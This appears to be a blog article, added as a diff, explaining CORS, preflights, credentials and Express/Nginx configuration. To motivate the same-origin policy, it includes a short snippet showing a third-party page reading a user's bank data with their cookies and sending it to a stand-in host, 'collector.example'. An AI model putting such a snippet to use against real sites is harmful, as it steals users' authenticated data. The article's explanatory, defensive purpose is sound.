@@ -1,0 +1,549 @@
+---
+title: "Your Browser Just Blocked Your Request. Why?"
+subtitle: "Postman says 200 OK. Chrome says CORS error. Same request — so what's actually going on?"
+date: 2026-10-05
+series: 1
+roadmap: [9, 10, 11]
+chain: request
+tags: [cors, http, browser, security, express]
+summary: "CORS errors look like the server refusing you. They aren't. Follow one blocked request through the browser — origins, preflights, credentials — and find out why it usually ran anyway."
+---
+
+**You use it every day. But do you actually know what happens underneath?** Few errors are as familiar, or as misunderstood, as this one.
+
+It's late, the feature is nearly done, and you wire the frontend to the API you shipped this afternoon. You're careful, so you test the endpoint in Postman first: `200 OK`, a clean JSON body, 38 milliseconds. Then you click the button in the browser, and the console turns red.
+
+<Compare leftTitle="Postman" rightTitle="Chrome, same URL" leftTone="ok" rightTone="bad">
+
+```http title="GET /orders · 200 OK · 38 ms"
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "orders": [
+    { "id": "ord_1042", "qty": 1 }
+  ]
+}
+```
+
+<DevTools
+  console={[
+    { level: "error", text: "Access to fetch at 'https://api.example.com/orders' from origin 'https://app.example.com' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource." },
+    { level: "error", text: "GET https://api.example.com/orders net::ERR_FAILED 200 (OK)" },
+  ]}
+/>
+
+</Compare>
+
+Same URL. Same method. Same server, which, as far as you can tell, answered. So who blocked what?
+
+This article follows that one request from your `fetch()` call to the server and back, stopping at every point where the browser makes a decision. By the end you'll be able to read any CORS error and know which layer to fix. You'll also know the fact most developers get wrong: **the "blocked" request usually reached your server and ran.** The browser only hid the answer.
+
+## What the developer sees
+
+Here is the full output Chrome gives you. Read it slowly once; every clause matters.
+
+<DevTools
+  console={[
+    { level: "error", source: "app.js:14", text: "Access to fetch at 'https://api.example.com/orders' from origin 'https://app.example.com' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource. If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled." },
+    { level: "error", source: "app.js:14", text: "GET https://api.example.com/orders net::ERR_FAILED 200 (OK)" },
+    { level: "error", source: "app.js:14", text: "Uncaught (in promise) TypeError: Failed to fetch" },
+  ]}
+  network={[
+    { name: "orders", method: "GET", status: "CORS error", type: "fetch", bad: true },
+  ]}
+/>
+
+Three details are worth noticing before going anywhere:
+
+1. **`net::ERR_FAILED 200 (OK)`.** The second line contains a status code. The server answered, and the answer was *success*. Hold on to that.
+2. **"blocked by CORS policy".** The browser is the one enforcing a policy. Not your server, not the network.
+3. **`TypeError: Failed to fetch`.** That's all your JavaScript gets: no status, no headers, no body. Your `catch` block can't tell a CORS failure from a dropped Wi-Fi connection, and that's deliberate, as you'll see.
+
+And Postman? Postman isn't a browser. It doesn't run code from other websites next to your logged-in sessions, so it has no reason to enforce the rule that just bit you. Neither does `curl`, nor one backend calling another. That's the first real clue: **CORS is a browser feature.** It exists to protect the person *using* the browser.
+
+## The problem it solves: one browser, many websites
+
+### What an origin is
+
+Browsers draw their security boundaries around **origins**. An origin is three things, and only three: the scheme, the host and the port.
+
+<UrlAnatomy />
+
+Two URLs are *same-origin* only when all three match. Paths and query strings never count. Try a few pairs:
+
+<OriginCompare />
+
+That `localhost:3000` versus `localhost:5173` pair is probably the most common CORS error in the world. Your frontend dev server and your API run on different ports, so they're different origins, even on the same laptop.
+
+### Why the browser cares
+
+Picture an ordinary afternoon. In one tab you're signed in to your bank. In another you're reading a random blog. That blog's JavaScript runs inside *your* browser, on *your* network, next to *your* cookies.
+
+Now imagine there were no rules. The blog's script could do this:
+
+```js title="random-blog.js"
+const res = await fetch('https://bank.example/api/accounts', {
+  credentials: 'include', // attach the bank cookies this browser is holding
+});
+const accounts = await res.json(); // ...and read your balances
+await fetch('https://collector.example/save', {
+  method: 'POST',
+  body: JSON.stringify(accounts),
+});
+```
+
+The bank would see a perfectly valid, logged-in request. It can't tell that you didn't make it. Only your browser knows the request came from a page on a *different origin*.
+
+So since the mid-1990s browsers have enforced the **same-origin policy**: a page may *send* requests to other origins (forms, images and scripts always could), but it may not *read* their responses. The same rule protects things only your browser can reach: your router's admin page at `192.168.1.1`, a dashboard on the office network, a service listening on `localhost`.
+
+<Callout type="insight" title="CORS is a door, not a wall">
+The same-origin policy is the wall. **CORS, Cross-Origin Resource Sharing, is a door in it:** the protocol a server uses to say "this other origin may read my responses". CORS never makes anything *more* locked down than the same-origin policy already does. It only relaxes it, on the server's terms. So a "CORS error" really means *the server didn't open the door for your origin*.
+</Callout>
+
+## What's actually happening underneath
+
+Let's slow the request down and watch every decision the browser makes.
+
+### Step 1: the browser stamps an `Origin` header
+
+When your page at `https://app.example.com` calls `fetch('https://api.example.com/orders')`, the browser notices the origins differ and adds a header you never wrote:
+
+```http title="Request" {3}
+GET /orders HTTP/1.1
+Host: api.example.com
+Origin: https://app.example.com
+Accept: */*
+```
+
+JavaScript can't set or change `Origin`. It's a *forbidden header* that only the browser controls, which is what makes it trustworthy for the browser's own check. Only there, though: `curl -H "Origin: https://app.example.com"` sends whatever it likes, which is why `Origin` is never authentication.
+
+### Step 2: the server answers, ideally with permission
+
+If the API wants `app.example.com` to read the response, it says so in a response header:
+
+```http title="Response" {3,4}
+HTTP/1.1 200 OK
+Content-Type: application/json
+Access-Control-Allow-Origin: https://app.example.com
+Vary: Origin
+```
+
+`Access-Control-Allow-Origin` holds exactly one origin, or `*` for "anyone". It can't hold a list, which is why servers keep an allowlist and echo back whichever origin matches. When they do, `Vary: Origin` tells caches that the response differs per origin. Remember that header; it comes back later.
+
+### Step 3: the response arrives, *then* the browser decides
+
+This is the part that surprises people. For an ordinary `GET`, the browser doesn't ask permission first. It sends the request, the server does the work and replies, and only then does the browser compare `Access-Control-Allow-Origin` with the page's origin. Watch it happen:
+
+<SequenceDiagram
+  title="A simple GET, blocked after the fact"
+  actors={[
+    { id: "js", label: "Your JS", sub: "app.example.com", icon: "js" },
+    { id: "browser", label: "Browser", sub: "network + CORS", icon: "browser" },
+    { id: "api", label: "API", sub: "api.example.com", icon: "server" },
+  ]}
+  steps={[
+    { from: "js", to: "browser", label: "fetch()", caption: "Your code calls `fetch('https://api.example.com/orders')`. As far as JavaScript knows, this is just a network call." },
+    { from: "browser", to: "browser", label: "cross-origin", tone: "warn", caption: "The browser compares origins: `https://app.example.com` against `https://api.example.com`. The hosts differ, so this is a cross-origin request and the CORS rules apply." },
+    { from: "browser", to: "api", label: "GET /orders", caption: "It's a simple request, so the browser sends it straight away, adding an `Origin` header for the server's benefit.", detail: "GET /orders HTTP/1.1\nHost: api.example.com\n+ Origin: https://app.example.com" },
+    { from: "api", to: "api", label: "handler runs", tone: "ok", caption: "The server doesn't know or care about CORS. It authenticates, queries the database and builds a perfectly good 200 response." },
+    { from: "api", to: "browser", label: "200 OK", tone: "ok", caption: "The whole response travels back to your machine: status, headers and body. Notice what's missing from it.", detail: "HTTP/1.1 200 OK\nContent-Type: application/json\n- Access-Control-Allow-Origin: https://app.example.com" },
+    { from: "browser", to: "browser", label: "CORS check ✗", tone: "bad", caption: "Now the browser runs its CORS check. No `Access-Control-Allow-Origin` header means no permission, so the response is quarantined." },
+    { from: "browser", to: "js", label: "TypeError", tone: "bad", caption: "Your `fetch()` promise rejects with `TypeError: Failed to fetch`. The 200 and its JSON body are sitting in the browser, and your code never gets to see them." },
+  ]}
+/>
+
+That's why Chrome printed `200 (OK)` in the same breath as "blocked". Both were true.
+
+### Simple requests and preflighted requests
+
+If the browser sends first and checks later, couldn't a malicious page fire a `DELETE` at your bank and simply not care about reading the reply? This is where the **preflight** comes in.
+
+Before CORS existed, a web page could already make some cross-origin requests. An HTML `<form>` could POST to any URL; an `<img>` tag could GET one. Servers had lived with that for a decade. So CORS was designed to let through, without asking first, *only what a form could already send*. These are called **simple requests**:
+
+- the method is `GET`, `HEAD` or `POST`;
+- the only headers you set are CORS-safelisted ones, such as `Accept`, `Accept-Language`, `Content-Language` and `Content-Type`;
+- `Content-Type`, if present, is one of the three values a form can produce: `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`.
+
+Step outside that box (`PUT`, `PATCH` or `DELETE`; `Content-Type: application/json`; an `Authorization` header; any custom `X-Something` header) and the browser holds your request back. First it sends an `OPTIONS` request asking whether the real one is allowed.
+
+<Predict
+  question="Which of these makes the browser send an OPTIONS preflight first?"
+  options={[
+    "`fetch(url)`, a plain GET",
+    "`fetch(url, { method: 'POST', body: new URLSearchParams({ q: 'books' }) })`",
+    "`fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body })`",
+    "`fetch(url, { credentials: 'include' })`, a GET that sends cookies",
+  ]}
+  answer={2}
+>
+Only the JSON `POST`. `application/json` isn't one of the three content types an HTML form can send, so the browser has to ask first. A form-encoded `POST` is something any `<form>` could already do. Cookies alone don't trigger a preflight either; they change what the *response* has to contain, as you'll see below.
+</Predict>
+
+### The preflight, line by line
+
+Say your frontend updates an order with a JSON body and a bearer token:
+
+```js title="client.js"
+await fetch('https://api.example.com/orders/1042', {
+  method: 'PUT',
+  headers: {
+    'Content-Type': 'application/json',
+    'Authorization': `Bearer ${token}`,
+  },
+  body: JSON.stringify({ qty: 2 }),
+});
+```
+
+Before that `PUT` leaves, the browser sends this on its own:
+
+```http title="Preflight request, sent by the browser" {1,3-5}
+OPTIONS /orders/1042 HTTP/1.1
+Host: api.example.com
+Origin: https://app.example.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: authorization,content-type
+```
+
+It's a question: *"Code from `https://app.example.com` wants to send a `PUT` with `authorization` and `content-type` headers. Is that all right?"* Two details are easy to miss. The header list is lower-cased and sorted. And the preflight carries **no cookies and no `Authorization` header**: it asks permission, it doesn't act.
+
+A server that agrees answers like this:
+
+```http title="Preflight response" {2-5}
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://app.example.com
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Max-Age: 7200
+Vary: Origin
+```
+
+The browser then checks, in order: the status is 2xx; `Allow-Origin` matches; `PUT` appears in `Allow-Methods` (the safelisted `GET`, `HEAD` and `POST` always pass); and every non-safelisted header the request wants appears in `Allow-Headers`, compared case-insensitively. Only if all of that passes does the real request go out, and its response must *again* carry `Access-Control-Allow-Origin`.
+
+<SequenceDiagram
+  title="A preflighted PUT that succeeds"
+  actors={[
+    { id: "js", label: "Your JS", sub: "app.example.com", icon: "js" },
+    { id: "browser", label: "Browser", sub: "network + CORS", icon: "browser" },
+    { id: "api", label: "API", sub: "api.example.com", icon: "server" },
+  ]}
+  steps={[
+    { from: "js", to: "browser", label: "fetch(PUT)", caption: "Your code asks for a `PUT` with a JSON body and a bearer token." },
+    { from: "browser", to: "browser", label: "preflight needed", tone: "warn", caption: "`PUT`, `Content-Type: application/json` and `Authorization` are all things a form could never send. The browser holds the request and asks first." },
+    { from: "browser", to: "api", label: "OPTIONS", caption: "The preflight: method `OPTIONS`, no body, no cookies, no token. Just the question.", detail: "OPTIONS /orders/1042 HTTP/1.1\n+ Origin: https://app.example.com\n+ Access-Control-Request-Method: PUT\n+ Access-Control-Request-Headers: authorization,content-type" },
+    { from: "api", to: "browser", label: "204", tone: "ok", caption: "The API's CORS middleware answers before authentication or routing run. Everything the browser asked about is allowed.", detail: "HTTP/1.1 204 No Content\n! Access-Control-Allow-Origin: https://app.example.com\n! Access-Control-Allow-Methods: GET, POST, PUT, DELETE\n! Access-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Max-Age: 7200" },
+    { from: "browser", to: "browser", label: "preflight ✓", tone: "ok", caption: "Every check passes. The browser caches this answer for 7200 seconds, so the next `PUT` to this URL skips the whole exchange." },
+    { from: "browser", to: "api", label: "PUT /orders/1042", caption: "Now the real request goes out, with the body and the `Authorization` header your code set.", detail: "PUT /orders/1042 HTTP/1.1\n+ Origin: https://app.example.com\nContent-Type: application/json\nAuthorization: Bearer eyJhbGciOi…" },
+    { from: "api", to: "browser", label: "200 OK", tone: "ok", caption: "The handler runs and replies. This response needs `Access-Control-Allow-Origin` too: passing the preflight doesn't excuse the real response.", detail: "HTTP/1.1 200 OK\nContent-Type: application/json\n+ Access-Control-Allow-Origin: https://app.example.com" },
+    { from: "browser", to: "js", label: "Response", tone: "ok", caption: "The CORS check passes again, and `await res.json()` finally gets the data." },
+  ]}
+/>
+
+### Credentials: when cookies enter the picture
+
+By default, `fetch()` sends cookies only to the page's own origin (`credentials: 'same-origin'`). To send cookies to *another* origin, you opt in:
+
+```js
+// with axios: { withCredentials: true }
+fetch('https://api.example.com/me', { credentials: 'include' });
+```
+
+That one option raises the bar for the response. With credentials, the browser insists on two things:
+
+- `Access-Control-Allow-Credentials: true`, with exactly that value;
+- an **exact** `Access-Control-Allow-Origin`. The wildcard `*` is rejected outright.
+
+Why so strict? Because `*` plus cookies is precisely the bank-tab attack from earlier: *any* website could read *your* logged-in data. The rule lives in the browser so that one careless header can't cause it. With credentials, `*` also stops meaning "anything" in `Allow-Methods`, `Allow-Headers` and `Expose-Headers`; it's treated as a literal name. And whether or not credentials are involved, `*` in `Allow-Headers` never covers `Authorization`. That one always has to be listed by name.
+
+<Callout type="danger" title="The classic CORS vulnerability">
+Some servers "fix" the wildcard error by echoing whatever `Origin` arrives straight back into `Access-Control-Allow-Origin`, alongside `Allow-Credentials: true`. The browser can no longer tell anything is wrong, and now every website on the internet can read your users' authenticated responses. Always compare against an explicit allowlist. And never allowlist the origin `null`: sandboxed iframes and local files send `Origin: null`, and an attacker can produce it too.
+</Callout>
+
+Cookies also follow rules of their own. In Chrome, a cookie set without a `SameSite` attribute is treated as `SameSite=Lax`, and Lax cookies aren't attached to a cross-*site* `fetch()` at all, whatever CORS says. `app.example.com` and `api.example.com` are different origins but the same *site* (both live under `example.com`), so default cookies still flow between them. A frontend on an entirely different domain needs the API's cookie set with `SameSite=None; Secure`.
+
+### Reading headers: `Access-Control-Expose-Headers`
+
+Even after a successful check, JavaScript sees only a short list of response headers: `Cache-Control`, `Content-Language`, `Content-Length`, `Content-Type`, `Expires`, `Last-Modified` and `Pragma`. Everything else, such as your `X-Request-Id`, your rate-limit counters, or the `Location` of a newly created resource, reads as `null` unless the server lists it:
+
+```http
+Access-Control-Expose-Headers: X-Request-Id, X-RateLimit-Remaining
+```
+
+If you've ever seen a header plainly in the Network tab while `res.headers.get()` returned `null`, this is why.
+
+### Preflight caching with `Max-Age`
+
+A preflight is an extra round trip in front of every non-simple request, which on a mobile network can easily cost a few hundred milliseconds. `Access-Control-Max-Age` lets the browser remember a successful preflight:
+
+- If the header is missing, the cache lasts just **5 seconds**.
+- Chrome caps it at **7200 seconds** (2 hours) and Firefox at 86,400 (24 hours). Larger values are quietly cut down.
+- The cache is keyed on the origin, the **exact URL** and the credentials mode. So `PUT /orders/1` and `PUT /orders/2` each need their own preflight. If your API puts IDs in its paths, that adds up quickly.
+
+In Chrome's Network tab, a preflight shows up as its own row with the type `preflight`, right next to the request it was asking about.
+
+### The whole vocabulary on one screen
+
+| Header | Sent with | What it says |
+| --- | --- | --- |
+| `Origin` | every CORS request | Which origin the calling page belongs to. Set by the browser, never by your code. |
+| `Access-Control-Request-Method` | preflight request | The method the real request will use. |
+| `Access-Control-Request-Headers` | preflight request | The non-safelisted headers the real request will send. |
+| `Access-Control-Allow-Origin` | response | Which origin may read this response: exactly one origin, or `*`. |
+| `Access-Control-Allow-Credentials` | response | `true` if the response may be read when credentials were sent. |
+| `Access-Control-Allow-Methods` | preflight response | Methods the real request may use. |
+| `Access-Control-Allow-Headers` | preflight response | Request headers the real request may send. |
+| `Access-Control-Expose-Headers` | response | Extra response headers JavaScript may read. |
+| `Access-Control-Max-Age` | preflight response | How many seconds the browser may cache this preflight. |
+| `Vary: Origin` | response | Tells caches that the response differs per origin. |
+
+## Blocked doesn't mean it didn't run
+
+Back to the line that started all this: `net::ERR_FAILED 200 (OK)`.
+
+When a *simple* request is blocked, the server has already received it, done the work and answered. The browser blocks the **response**, not the request. For a `GET` that's merely confusing. For a `POST`, it can cost money:
+
+<SequenceDiagram
+  title="The order that was placed twice"
+  actors={[
+    { id: "js", label: "Checkout", sub: "app.example.com", icon: "js" },
+    { id: "browser", label: "Browser", sub: "network + CORS", icon: "browser" },
+    { id: "api", label: "API", sub: "api.example.com", icon: "server" },
+    { id: "db", label: "Database", sub: "orders table", icon: "db" },
+  ]}
+  steps={[
+    { from: "js", to: "browser", label: "fetch(POST)", caption: "The checkout page submits an order as `application/x-www-form-urlencoded`, exactly like an HTML form would. That's a simple request: no preflight." },
+    { from: "browser", to: "api", label: "POST /orders", caption: "The browser sends it immediately, session cookie and all.", detail: "POST /orders HTTP/1.1\n+ Origin: https://app.example.com\nContent-Type: application/x-www-form-urlencoded\nCookie: session=4b1d…" },
+    { from: "api", to: "db", label: "INSERT", tone: "ok", caption: "The server checks the session, validates the order and inserts it. The order now exists." },
+    { from: "api", to: "browser", label: "201", tone: "ok", caption: "The route was added last week and nobody configured CORS for it. The reply has no `Access-Control-Allow-Origin`.", detail: "HTTP/1.1 201 Created\nLocation: /orders/1043\n- Access-Control-Allow-Origin: https://app.example.com" },
+    { from: "browser", to: "browser", label: "CORS check ✗", tone: "bad", caption: "The browser refuses to hand the response to the page." },
+    { from: "browser", to: "js", label: "TypeError", tone: "bad", caption: "The checkout page catches `TypeError: Failed to fetch` and shows \"Something went wrong. Please try again.\"" },
+    { from: "js", to: "api", label: "POST again", tone: "warn", caption: "The customer tries again. Or a well-meaning retry helper does it for them." },
+    { from: "api", to: "db", label: "INSERT", tone: "bad", caption: "A second order. The server's logs show two clean `201`s; only the browser ever saw an error." },
+  ]}
+/>
+
+So: **blocked is not the same as not executed.** Preflighted requests behave differently in one important way. If the *preflight* fails, the browser never sends the real request, so nothing runs except the `OPTIONS` check. But if the preflight passes and the *real* response comes back without CORS headers (the 500 case below), the request ran.
+
+<Callout type="insight" title="The same shape shows up everywhere">
+"I got an error, so it didn't happen" is one of the most expensive assumptions in backend engineering. A CORS block, a timeout and a dropped connection all have the same shape: the client lost the *answer*, not necessarily the *action*. Later in this blog we'll see why a timeout doesn't mean the operation failed, and why payment APIs insist on idempotency keys. It's also why CORS can't protect you from CSRF: a cross-site form post is a simple request, and it runs.
+</Callout>
+
+## Try it: the CORS playground
+
+Everything above fits in one widget. Pick a scenario, then change one thing at a time: the method, a header, the credentials mode, the server's config, or something in between. It shows whether a preflight is needed and why, every header on the wire, which check fails, the exact console message, and the part DevTools never tells you: whether the server actually ran your request.
+
+<CorsPlayground />
+
+A few experiments worth trying:
+
+- Start from **Works in Postman** and set the API to the allowlist. Then switch the page origin to `attacker.example`. The request is still sent, and it still runs.
+- From **JSON + token, done right**, set Allow-Headers to `*`. Why does it still fail? There are two separate reasons, one of them about credentials.
+- From **Wildcard + cookies**, change credentials to `omit`, and watch the same server config start working.
+- Turn on **Send it again a minute later**, then try each Max-Age value.
+
+## Setting it up properly in Express
+
+In Express the usual tool is the [`cors` middleware](https://github.com/expressjs/cors). Here's a setup for an API called by a browser app with cookie or token auth, followed by the same behaviour written by hand, so you can see there's no magic in it:
+
+<CodeTabs labels={["Express + cors", "Raw headers"]}>
+
+```js title="server.js"
+import express from 'express';
+import cors from 'cors';
+
+const app = express();
+
+const corsOptions = {
+  // Exact origins only. No trailing slash: an Origin header never has a path.
+  origin: ['https://app.example.com', 'http://localhost:5173'],
+  credentials: true, // Access-Control-Allow-Credentials: true
+  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
+  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-Id'],
+  exposedHeaders: ['X-Request-Id'],
+  maxAge: 7200, // cache preflights for 2 hours, Chrome's cap
+};
+
+// First, before auth, body parsers and routes: every response gets the headers,
+// and preflights are answered (204) before anything else can reject them.
+app.use(cors(corsOptions));
+
+app.use(express.json());
+app.use(requireAuth);
+app.use('/orders', ordersRouter);
+```
+
+```js title="server.js"
+const ALLOWED_ORIGINS = new Set(['https://app.example.com', 'http://localhost:5173']);
+
+app.use((req, res, next) => {
+  const origin = req.headers.origin;
+  res.vary('Origin'); // the response depends on Origin, so tell caches
+
+  if (origin && ALLOWED_ORIGINS.has(origin)) {
+    res.setHeader('Access-Control-Allow-Origin', origin);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
+    res.setHeader('Access-Control-Expose-Headers', 'X-Request-Id');
+  }
+
+  // A preflight is an OPTIONS request that carries Access-Control-Request-Method.
+  if (req.method === 'OPTIONS' && req.headers['access-control-request-method']) {
+    if (origin && ALLOWED_ORIGINS.has(origin)) {
+      res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE');
+      res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Request-Id');
+      res.setHeader('Access-Control-Max-Age', '7200');
+    }
+    return res.sendStatus(204); // answer it here; never let it reach auth
+  }
+
+  next();
+});
+```
+
+</CodeTabs>
+
+A few things in there are deliberate:
+
+- **Order.** `cors()` goes first. Anything registered before it, such as an auth check, a rate limiter or `express.json()` rejecting a malformed body, produces responses without CORS headers, and those surface in the browser as baffling CORS errors.
+- **The middleware never blocks anything.** Look at the raw version again: an unknown origin still gets a normal response, just without `Access-Control-Allow-Origin`. CORS middleware only *adds headers*. The browser does the enforcing, which is why `curl` sails straight through.
+- **`Vary: Origin`.** The `cors` package adds it whenever the allowed origin depends on the request. Hand-written code has to remember.
+- **Rejecting an origin quietly.** If you use the function form of `origin`, call `callback(null, false)` for unknown origins. Passing an `Error` sends the request to your error handler, and the resulting 500 has no CORS headers, so the browser reports a CORS error for what is really your own error handler.
+
+And on the client:
+
+```js title="client.js"
+const res = await fetch('https://api.example.com/orders', {
+  method: 'POST',
+  credentials: 'include', // only for cookies; a token in a header doesn't need it
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ item: 'book', qty: 1 }),
+});
+```
+
+<Callout type="tip" title="The best CORS configuration is none at all">
+If the browser app and the API can share an origin, CORS disappears, and so do the preflight round trips. In development, let the dev server proxy API calls (Vite's `server.proxy`, or `rewrites` in Next.js), so the browser only ever talks to `localhost:5173`. In production, a reverse proxy can serve the API under the app's own origin, at `https://app.example.com/api`. What a reverse proxy actually does gets its own article in Series 2.
+</Callout>
+
+## What breaks when it fails
+
+Many of the hardest CORS bugs in production have nothing to do with your `cors()` options. They're responses that never pass through your CORS code at all. In the console they all look the same, so learn to read the Network tab instead.
+
+### The 500 that looks like a CORS error
+
+Your handler throws, and the error is handled by something that doesn't add CORS headers: an error handler registered before `cors()`, a crashed process behind a proxy, a 502 or 504 from the load balancer, a 413 "payload too large" from Nginx. The browser receives an error response without `Access-Control-Allow-Origin`, so the console says *CORS* and your JavaScript gets a `TypeError` instead of the status. The Network tab, meanwhile, shows the true status code.
+
+If your CORS headers live in Nginx, there's a classic trap: `add_header` only applies to 2xx and 3xx responses unless you add `always`.
+
+```nginx title="nginx.conf" {9,10}
+map $http_origin $cors_origin {
+    default                   "";
+    "https://app.example.com" $http_origin;
+}
+
+server {
+    location /api/ {
+        proxy_pass http://app:3000;
+        add_header Access-Control-Allow-Origin $cors_origin always;  # "always": 4xx and 5xx too
+        add_header Vary Origin always;
+    }
+}
+```
+
+Pick one layer to own CORS. If Nginx and your app both add `Access-Control-Allow-Origin`, Chrome refuses the response with *"The 'Access-Control-Allow-Origin' header contains multiple values …, but only one is allowed."*
+
+### Auth middleware answering `OPTIONS` with 401
+
+Preflights carry no cookies and no `Authorization` header, by design. If an authentication check runs before CORS handling, it sees an anonymous request and answers `401`. Depending on whether CORS headers were already added, the browser reports one of these:
+
+```text title="Chrome console, one of these" wrap
+Response to preflight request doesn't pass access control check: It does not have HTTP ok status.
+Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource.
+```
+
+Either way, the real request is never sent. The fix is ordering: handle CORS, and answer preflights, before authentication, as in the Express example. If a gateway authenticates requests for you, check that it lets `OPTIONS` through unauthenticated.
+
+### Proxies and CDNs that change your headers
+
+Anything between the browser and your app can break CORS while your code is correct:
+
+- **A proxy or gateway answers `OPTIONS` itself**, often with `405 Method Not Allowed`, so your CORS middleware never sees the preflight.
+- **Headers get stripped.** A proxy that only forwards headers it knows about drops every `Access-Control-*` header on the way out.
+- **A CDN serves one origin's answer to another.** The first visitor, from `admin.example.com`, gets a response with `Access-Control-Allow-Origin: https://admin.example.com`. The CDN caches it by URL alone. The next visitor, from `app.example.com`, gets the cached copy and a CORS error. It works on a cold cache and fails on a warm one, the most baffling kind of intermittent bug. `Vary: Origin`, or adding `Origin` to the cache key, fixes it.
+
+### Redirects during preflight
+
+A preflight must get a 2xx answer. If `OPTIONS /orders` is answered with a redirect, whether `http://` to `https://`, `/orders` to `/orders/`, or an expired session bouncing to `/login`, Chrome stops:
+
+```text title="Chrome console" wrap
+Response to preflight request doesn't pass access control check: Redirect is not allowed for a preflight request.
+```
+
+Call the final URL directly: right scheme, right trailing slash.
+
+### A 60-second debugging routine
+
+<Steps>
+<Step title="Open the Network tab, not the console">
+Find the failing request. Is there a row of type `preflight` next to it? That tells you whether you're debugging the preflight or the real response.
+</Step>
+<Step title="Read the status code first">
+A non-2xx preflight, or a 4xx or 5xx on the real request, means the problem is *whatever produced that status*, such as auth, a crash or a proxy, rather than your CORS options.
+</Step>
+<Step title="Compare the headers character by character">
+`Access-Control-Allow-Origin` must equal the request's `Origin` exactly: same scheme, host and port, and no trailing slash. With credentials it can't be `*`, and `Access-Control-Allow-Credentials` must be `true`.
+</Step>
+<Step title="Reproduce it without a browser">
+`curl` shows you exactly what the server sends, with nothing hidden:
+
+```bash
+curl -i -X OPTIONS https://api.example.com/orders \
+  -H "Origin: https://app.example.com" \
+  -H "Access-Control-Request-Method: PUT" \
+  -H "Access-Control-Request-Headers: authorization,content-type"
+```
+</Step>
+<Step title="Walk every hop">
+If your app's own response is right but the browser's isn't, something in between (a CDN, a gateway, Nginx) is changing it. Compare a request that skips each layer in turn.
+</Step>
+</Steps>
+
+## What developers commonly get wrong
+
+**"CORS protects my API."** It doesn't. It protects *people using browsers* from pages that would read data with their cookies. `curl`, Postman, scripts and other servers ignore CORS completely, because there's no victim browser to protect. Your API still needs authentication and authorisation on every route. CORS is not a server-to-server security mechanism.
+
+**"The `Origin` allowlist is a kind of authentication."** Anyone outside a browser can send any `Origin` they like. Treat it as a hint that the *browser* enforces, never as proof of who's calling.
+
+**"CORS stops CSRF."** CORS stops a cross-origin response from being *read*, not a request from being *sent*. A cross-site form `POST` is a simple request; it reaches your server with the victim's cookies and runs. Stopping that is a different job with different tools, which is exactly where the next article picks up.
+
+**"The browser blocked my request."** It blocked the *response*. For simple requests, and for any real request that follows a passing preflight, the server has already done the work. Treat a CORS failure on a write like a timeout: the action may well have happened.
+
+**"A 'disable CORS' extension fixes it."** Extensions and `--disable-web-security` switch the check off *in your browser only*. Every one of your users still gets the error, and while the switch is on, the pages you visit lose the protection the check exists to give. Use them to confirm a diagnosis, never as a fix.
+
+**"`mode: 'no-cors'` makes the error go away."** It does, by handing you an *opaque* response: status `0`, no headers, an empty body. You can't read anything, and you're restricted to simple requests. It has uses, such as fire-and-forget pings and service-worker caching, but calling your API isn't one of them.
+
+**"`Access-Control-Allow-Origin: *` is always dangerous."** For genuinely public, cookie-free data such as a public API, web fonts or open datasets, `*` is exactly right, and the browser already refuses it whenever credentials are involved. The real dangers are reflecting arbitrary origins *with* credentials, and `*` on internal services that only your colleagues' browsers can reach.
+
+## Summary
+
+<FiveQuestions
+  problem="Browsers run code from many sites side by side, with your cookies and your network access. The same-origin policy stops one origin's JavaScript from reading another origin's responses; CORS is how a server lets specific origins back in."
+  sees="It works in Postman or curl and fails in the browser with `blocked by CORS policy`, often next to `net::ERR_FAILED 200 (OK)`. JavaScript only gets `TypeError: Failed to fetch`."
+  underneath="The browser adds `Origin`, sends simple requests straight away and checks `Access-Control-Allow-Origin` on the response. Anything a form couldn't send gets an `OPTIONS` preflight first. Credentials demand an exact origin plus `Allow-Credentials: true`, and `Max-Age` caches preflights per URL."
+  breaks="Error responses without CORS headers (5xx pages, gateways, Nginx without `always`), auth middleware answering the preflight with 401, proxies and CDNs stripping, duplicating or cross-caching headers, and redirects on the preflight."
+  misconception="That CORS secures your API or stops CSRF, and that a blocked request never ran. CORS only decides who may read a response inside a browser. Blocked is not the same as not executed."
+/>
+
+## What's next
+
+One question is left hanging. If CORS doesn't stop a cross-site form from *submitting*, what does? And what makes a forged request different from a merely cross-origin one? That's the next article in this series: **What is CSRF, and how is it different from CORS?**
+
+On the [Follow One Request](/chains/request/) chain, the next stop leaves the browser behind. Before any of this can happen, `api.example.com` has to turn into an IP address. That's DNS.
+
+### Sources and further reading
+
+- MDN Web Docs: [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)
+- MDN Web Docs: [Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy)
+- MDN Web Docs: [Access-Control-Max-Age](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Max-Age), including each browser's cap
+- WHATWG Fetch Standard: [The CORS protocol](https://fetch.spec.whatwg.org/#http-cors-protocol)
+- OWASP: [HTML5 Security Cheat Sheet, Cross-Origin Resource Sharing](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
+- OWASP Web Security Testing Guide: [Testing Cross Origin Resource Sharing](https://wstg.owasp.org/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing/)
+- expressjs/cors: [configuration options](https://github.com/expressjs/cors#configuration-options)
